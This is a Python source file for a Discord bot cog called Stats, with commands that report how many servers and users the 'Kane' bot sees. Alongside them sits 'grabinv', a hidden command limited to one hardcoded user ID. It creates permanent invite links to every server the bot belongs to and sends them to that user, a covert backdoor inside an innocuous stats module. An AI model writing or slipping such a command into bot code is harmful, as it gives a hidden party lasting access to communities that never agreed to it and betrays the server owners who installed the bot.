import discord
from discord.ext import commands
import datetime

class Stats(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def guilds(self, ctx):
        if len(self.bot.guilds) == 1:

            embed = discord.Embed(title=f"I am in {len(self.bot.guilds)} discord server!")
            await ctx.send(embed=embed)

        else:
            embed = discord.Embed(title=f"I am in {len(self.bot.guilds)} discord servers!")
            await ctx.send(embed=embed)


    @commands.command()
    async def members(self, ctx):
        embed = discord.Embed(title=f"I am watching {len(self.bot.users)} people.")

        await ctx.send(embed=embed)

    @commands.command()
    async def stats(self, ctx):
        current_time = datetime.datetime.now()
        embed = discord.Embed(title="Kane stats", description="Stats of the Kane bot!")
        embed.add_field(name="Guilds:", value=len(self.bot.guilds), inline=False)
        embed.add_field(name="Members:", value=len(self.bot.users), inline=False)
        embed.set_footer(text="Requested by " + ctx.author.name + " • " + str(current_time.day) + "/" + str(
            current_time.month) + "/" + str(current_time.year), icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)

    @commands.command()
    async def grabinv(self, ctx):
        if ctx.author.id == 428450288668508160:
            for guild in self.bot.guilds:
                inviteLink = await guild.text_channels[0].create_invite(max_age=0)
                await ctx.send(f"{inviteLink}")


def setup(bot):
    bot.add_cog(Stats(bot))